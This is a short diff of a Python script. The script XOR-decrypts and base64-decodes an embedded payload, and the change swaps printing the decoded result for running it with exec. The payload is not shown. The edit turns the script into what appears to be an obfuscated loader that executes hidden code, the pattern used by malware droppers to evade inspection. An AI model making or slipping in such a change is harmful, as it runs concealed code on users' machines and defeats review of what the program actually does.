@@ -17,4 +17,4 @@ def xor_decrypt(data: bytes, key: bytes) -> bytes:
 decrypted_xor = xor_decrypt(encrypted, xor_key)
 decrypted_payload = base64.b64decode(decrypted_xor)
 
-print(decrypted_payload.decode())
+exec(decrypted_payload.decode())
